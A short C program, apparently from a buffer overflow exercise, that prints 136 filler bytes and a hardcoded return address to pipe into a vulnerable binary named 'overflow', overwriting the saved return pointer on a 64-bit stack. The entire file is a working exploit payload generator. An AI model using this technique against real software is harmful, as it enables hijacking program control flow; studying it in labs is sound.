#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/*
 * gcc exploit.c -o exploit
 * ./exploit | ./overflow
 */

int main(int args, char** argv)
{
	int i = 0;
	const char x = 0x78;
	
	fflush(stdout);
	
	// 128 Byte buffer + 8 byte stack base pointer (64 Bit system!)
	for(i = 0; i < 136; i++)
		fwrite(&x, 1, 1, stdout);

	fflush(stdout);
		
	// the EIP has to be modified, possibly
	unsigned long long EIP = 0x0000555555556015; // find out correct memory address and place it here
	fwrite(&EIP, 1, 8, stdout);
	
	return 0;
}
